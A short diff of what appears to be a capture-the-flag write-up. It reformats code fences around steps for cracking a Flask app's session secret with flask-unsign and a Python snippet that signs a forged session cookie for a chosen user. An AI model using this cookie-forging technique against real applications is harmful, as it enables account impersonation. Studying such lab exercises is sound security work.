@@ -126,7 +126,8 @@ _______________________________________________
 <br> Now we know that we have to messup with this session cookie ! but we are sure that since it is a flask app again. we have to crack the secret key by using ```Flask-unsign -c -u <token> ``` command. and the secret key is "secret-key-goes-here" lol . 
 <br> now that we have the secret key , one of the ideas to create a new token is to create a flask application with the same secret key and set the user string the way we like.
 <br> example of a python code :
-<br> ``` py
+<br>
+``` py
 from flask import Flask, session, redirect
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret-key-goes-here'
@@ -135,6 +136,7 @@ def index():
     session['user'] = "put your username here"
     return session.get('user')
 
-app.run(host='127.0.0.1', port=8000) ``` 
+app.run(host='127.0.0.1', port=8000) 
+``` 
 <br> run this flask app and get the needed token !
 
